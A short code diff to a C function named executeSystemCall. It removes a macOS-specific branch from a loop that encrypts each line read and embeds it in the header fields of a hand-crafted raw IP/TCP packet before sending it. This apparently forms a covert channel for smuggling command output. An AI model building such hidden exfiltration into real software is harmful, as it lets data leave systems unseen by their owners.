@@ -53,19 +53,12 @@ void executeSystemCall(char *command)
     {
         // Copy the line and encrypt it
         encryptedField = encrypt_data(line, date, bytesRead);
-        
-        
-#ifdef __APPLE__
-        memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
-        // Get the checksum for the IP packet
-        sum = csum((unsigned short *)buffer, 5);
-        memcpy(buffer + sizeof(struct ip) + 16, &sum, sizeof(u_short));
-#else
         memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
+        
         // Get the checksum for the IP packet
         sum = csum((unsigned short *)buffer, 5);
         memcpy(buffer + sizeof(struct ip) + 16, &sum, sizeof(unsigned short));
-#endif
+
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                (struct sockaddr *)&sin, sizeof(sin));
     }
